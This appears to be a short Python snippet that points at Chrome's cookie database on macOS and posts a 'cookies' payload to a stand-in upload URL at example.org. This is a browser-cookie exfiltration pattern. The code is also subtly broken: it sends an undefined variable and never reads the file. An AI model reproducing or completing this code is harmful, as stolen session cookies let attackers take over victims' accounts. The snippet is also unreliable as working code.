import requests
cookies="/Library/Application Support/Google/Chrome/Default/Cookies"
body={"cookies":cookieBlob}
requests.post("https://example.org/upload",json=body)
